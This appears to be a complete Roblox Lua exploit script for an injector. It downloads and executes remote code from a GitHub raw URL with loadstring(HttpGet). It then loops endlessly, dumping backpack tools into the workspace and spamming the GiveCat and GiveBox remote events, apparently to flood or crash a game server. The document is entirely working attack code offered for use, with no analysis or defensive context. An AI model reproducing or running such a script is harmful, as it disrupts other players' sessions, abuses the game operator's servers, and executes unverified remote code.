wait(5)
warn("bot loaded")
loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua", true))()
wait(1)
task.spawn(
    function()
        while true do
            wait()
        for _, x in next, game.Players.LocalPlayer.Backpack:GetChildren() do
            if x:IsA("Tool") then
                x.Parent = game.Players.LocalPlayer.Character
                x.Parent = workspace
            end
        end
        game.ReplicatedStorage.GiveCat:FireServer()
        game.ReplicatedStorage.GiveCat:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
    end
end
)
